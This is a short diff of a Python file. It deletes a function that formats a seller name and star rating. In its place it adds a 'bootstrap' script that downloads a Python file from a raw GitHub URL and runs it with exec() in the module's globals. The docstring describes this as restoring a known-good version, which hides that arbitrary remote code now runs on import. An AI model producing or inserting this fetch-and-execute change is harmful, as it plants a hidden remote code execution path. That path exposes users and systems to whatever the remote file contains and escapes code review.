@@ -1,10 +1,9 @@
-def riga_venditore(extra: dict) -> str:
-    """Riga del venditore con la sola valutazione complessiva su 5."""
-    if not extra.get("venditore"):
-        return ""
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""Bootstrap that restores the known-good rating-only version."""
 
-    riga = "👤 {}".format(html.escape(str(extra["venditore"])))
-    voto = (extra.get("stelle") or "").strip()
-    if voto:
-        riga += " · ⭐ {}/5".format(html.escape(voto))
-    return riga
+import urllib.request
+
+URL = "https://raw.githubusercontent.com/darkman1997/Vinted/6486d49a2dee1e2759b486ef120efc836cf8b2dc/vinted.py"
+source = urllib.request.urlopen(URL, timeout=45).read().decode("utf-8", "replace")
+exec(compile(source, URL, "exec"), globals(), globals())
